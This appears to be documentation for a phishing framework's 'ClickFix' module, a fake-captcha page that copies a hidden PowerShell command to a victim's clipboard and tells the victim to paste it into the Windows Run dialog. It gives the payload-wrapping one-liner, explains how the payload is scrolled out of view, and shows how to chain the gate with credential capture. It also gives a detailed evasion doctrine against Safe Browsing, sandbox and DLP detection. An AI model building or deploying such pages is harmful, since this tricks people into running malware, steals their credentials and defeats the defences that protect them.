---
layout: default
title: ClickFix gate
description: Fake-captcha social engineering — clipboard payload with before/after position and detection hardening.
---

# ClickFix — fake captcha gate

A social-engineering layer that serves a convincing "verification" page which
silently copies a command to the victim's clipboard and instructs them to run
it. When the victim clicks the fake captcha checkbox and follows the
instructions (Win+R → Ctrl+V → Enter), the payload executes on their machine.

This is configured **per-phishlet** in the YAML — no separate object to manage.

## How it works

```
Victim visits lure URL
  │
  ├─ position: before ─────────────────────────────────┐
  │   Stage 1: captcha widget (checkbox only)          │
  │   → checkbox click → clipboard = {command}         │
  │   Stage 2: instructions — Win+R, Ctrl+V, Enter     │
  │   → Verify button (enables after random delay)     │
  │   → redirect → phishing login                       │
  │   → victim enters credentials → captured           │
  │                                                    │
  ├─ position: after ──────────────────────────────────┤
  │   Victim enters credentials → captured             │
  │   → "One more step" captcha page                   │
  │   → checkbox click → clipboard = {command}         │
  │   → instructions — Win+R, Ctrl+V, Enter            │
  │   → redirect to real site                          │
  └────────────────────────────────────────────────────┘
```

`windows-fix` replicates the real-world ClickFix campaigns (as documented by
Malwarebytes, 2025-03): a pixel-faithful Google reCAPTCHA widget first, the
instruction panel only appears *after* the checkbox is ticked. The Verify
button starts dimmed/disabled and silently enables after a random 5–15 s
delay (no countdown text); clicking it re-arms the clipboard, shows a
"Verification Complete" state and redirects. A silent auto-redirect after
30–60 s remains as a fallback for victims who never click.

## Configuration

Add the `clickfix` section to any phishlet YAML:

```yaml
clickfix:
  template: cloudflare-turnstile     # template name (see below)
  command: "powershell -w hidden -e <base64>"  # payload to clipboard
  position: before                    # "before" (pre-login) or "after" (post-capture)
  only: false                         # true = clickfix-only mode (no login flow)
  subdomain: login.example.com        # display domain override (if the template shows one)
```

| Field | Description |
|---|---|
| `template` | Template file name: `clickfix/templates/<name>.html` |
| `command` | Payload string copied to the victim's clipboard |
| `position` | `before` = pre-login gate; `after` = post-capture "one more step" |
| `only` | Clickfix-only mode: the gate is served *before* session creation and the victim is redirected to the lure's `redirect_url` afterwards — pure payload delivery, no credential flow |
| `subdomain` | Display domain shown inside the page (branding override; empty = request host) |

Hot-reload applies immediately — edit the phishlet YAML and the gate activates
on the next victim request (no service restart).

## The clipboard command and Verification ID

Unless the `command` already starts with a known interpreter
(`powershell`, `cmd`, `mshta`, `rundll32`, `certutil`, `bitsadmin`, `curl`,
`wget`, `start` — passed through as-is), the payload is wrapped in a
PowerShell one-liner whose **unified tail is identical across every template**:

```
powershell -w hidden -ep bypass -c "<command>;$id='I am not a robot - reCAPTCHA Verification ID: 4821'"
```

- The **Verification ID is a random 4-digit number generated server-side per
  request** (real-campaign format) and substituted into **both** the clipboard
  command and the page display — they always match.
- The tail is long enough that in the Windows Run dialog only
  `... 'I am not a robot - reCAPTCHA Verification ID: 4821'` stays visible —
  the payload scrolls out of view, exactly like the observed campaigns.
- `I am not a robot` (no apostrophe) is deliberate: the string must stay safe
  inside PowerShell single quotes. The page itself displays the variant with
  the apostrophe (`I'm not a robot`), mirroring the real pages.

## Templates

Templates are self-contained HTML files deployed to the node (gitignored, like
campaign phishlets). Three styles ship with the fork:

| Template | Visual style |
|---|---|
| `cloudflare-turnstile` | "Checking if you are human" + Turnstile checkbox widget, Cloudflare branding |
| `windows-fix` | Real-campaign replica: Google reCAPTCHA widget → instruction panel with keyboard-key badges and the observe/agree line |
| `recaptcha` | Minimal Google reCAPTCHA widget on a clean white page (title `reCAPTCHA`, swirl favicon) — official logo, checkbox, Privacy · Terms; expands to the same 2-stage gate |

### Placeholders

| Placeholder | Substituted by | Used in |
|---|---|---|
| `{command_b64}` | Base64-encoded command (preferred — no cleartext in source) | Both |
| `{command}` | Raw command string (legacy — cleartext) | Both |
| `{redirect_url}` | Post-verify redirect target | Both |
| `{lure_url_js}` | JS-safe lure URL with forwarder param | Auto (via replaceHtmlParams) |

### Deploying templates

```bash
scp src/clickfix/templates/*.html <node>:/path/to/clickfix/templates/
```

The Go binary loads templates from `clickfix/templates/` relative to the
phishlets directory. Create custom templates by writing a self-contained HTML
file with the placeholders above.

## Detection hardening

All templates follow the same anti-classification doctrine as the credential
phishing pages ([CSD hardening](evasion#4-csd-hardening-client-side-detection)):

1. **Zero sensitive content in the initial DOM** — instruction text ("Win+R",
   "Ctrl+V"), brand elements and the clipboard payload are all absent from the
   page at load time. The victim sees only a spinner. Content classifiers
   (Safe Browsing page analysis, sandbox detonation, DLP rules) have nothing
   to match.
2. **Base64-encoded payload** — the command is never cleartext in the page
   source; decoded at runtime via `atob()`.
3. **Lazy text injection** — all social-engineering keywords are base64
   strings in the source, decoded and injected into the DOM only when the
   state machine advances after a user gesture.
4. **Brand lazy-reveal** (templates with branded headers) — logo and domain
   hidden behind `visibility:hidden` until the first
   `pointermove`/`keydown` (same as the ms365 CSD v2 pattern).
5. **Randomized fingerprint** — variable timing, random verification IDs,
   dynamic text injection order — no byte-identical page across loads.
6. **Inline SVG favicon** (brand-matched) + generic title +
   `robots: noindex,nofollow` + `Cache-Control: no-store`.

## Clipboard mechanism

Poisoning uses the hidden-textarea `document.execCommand('copy')` technique —
deliberately **not** `navigator.clipboard.writeText()`, which triggers a
clipboard permission popup outside a user gesture and breaks the illusion
(lesson learned in field testing).

The payload is armed at three points:

1. **First gesture anywhere** (`pointerdown`/`keydown`, once) — covers victims
   who arrive mid-page and interact before touching the widget
2. **Checkbox click** — the primary, gesture-guaranteed copy
3. **Again when the instruction panel opens** — belt-and-braces re-copy

## Integration hooks (maintainer reference)

| Hook | File:line | Behavior |
|---|---|---|
| Pre-auth gate | `http_proxy.go` ~535 | Serves template at the lure path when `position=before` and not a forwarder URL |
| Post-auth gate | `http_proxy.go` ~1381 | Replaces `javascriptRedirect` when `position=after` and session `IsDone` |
| Template loader | `clickfix.go` | Reads from `clickfix/templates/`, validates path traversal |
| Renderer | `clickfix.go` | Substitutes `{command_b64}`, `{command}`, `{redirect_url}` |

## Related

- [Phishlet authoring](phishlet-authoring) — the `clickfix` YAML section reference
- [Evasion](evasion#10-clickfix-gate-hardening) — where this fits in the defense-layer map
- [skills/creating-phishlets](https://github.com/dn9uy3n/RedPhish/tree/main/skills/creating-phishlets) — AI-agent authoring skill
